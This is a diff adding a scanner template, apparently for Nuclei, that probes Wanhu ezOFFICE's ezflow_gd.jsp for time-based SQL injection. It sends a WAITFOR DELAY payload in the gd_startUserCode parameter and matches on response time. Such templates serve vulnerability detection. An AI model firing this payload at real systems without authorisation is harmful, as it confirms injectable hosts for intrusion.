@@ -1,0 +1,51 @@
+id: poc-yaml-whir-ezoffice-ezflowgd-jsp-sqli
+info:
+  name: 万户 ezOFFICE ezflow_gd.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(6, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1, 4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp?gd=1&gd_startUserCode=1%27%3BWAITFOR%20DELAY%20'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+      - type: word
+        words:
+          - ""
+        part: body
+        condition: and
+
+  - raw:
+      - |
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp?gd=1&gd_startUserCode=1%27%3BWAITFOR%20DELAY%20'0:0:{{t3}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
+      - type: word
+        words:
+          - ""
+        part: body
+        condition: and
